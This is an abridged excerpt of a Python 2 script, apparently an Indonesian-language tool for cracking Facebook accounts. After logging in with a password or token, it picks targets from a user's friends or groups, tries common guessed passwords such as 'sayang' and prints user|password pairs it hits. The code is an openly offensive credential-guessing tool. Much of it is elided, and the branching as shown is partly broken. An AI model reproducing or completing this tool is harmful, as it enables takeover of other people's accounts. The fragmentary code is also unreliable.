...
def masuk():
	os.system('reset')
	print logo
	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97mLogin"
	print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97mLogin using token"
	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97mExit"
	print "\033[1;97m║"
	msuk = raw_input(">>>")
	if msuk =="":
...
def menu():
    ...
    os.system('clear')
    print logo
    print '1. Crack from friend '
    print '2. Crack from Group  '
    print '0. Kembali '
    print "\033[31;1m=================================="
    pilih_mbf()
...
def pilih_mbf():
    ...
    if peak == '':
        print '\x1b[31;1m[!] \x1b[31;1misi yang bener Kntl'
        pilih_mbf()
    else:
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                if 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;93m[\x1b[1;93mCp\xe2\x9c\x9a\x1b[1;93m] ' + user +'|' + pass1 +'==>' + b['name']
                    print 55 * '\x1b[1;97m\xe2\x95\x90'
                else:               
                    ...
                    if 'access_token' in q:
                        ...
                        if 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;93m[\x1b[1;93mCp\xe2\x9c\x9a\x1b[1;93m] ' + user +'|' + pass2 +'==>' + b['name']
                            print 55 * '\x1b[1;97m\xe2\x95\x90'
                        else:
                           pass3 = 'sayang'
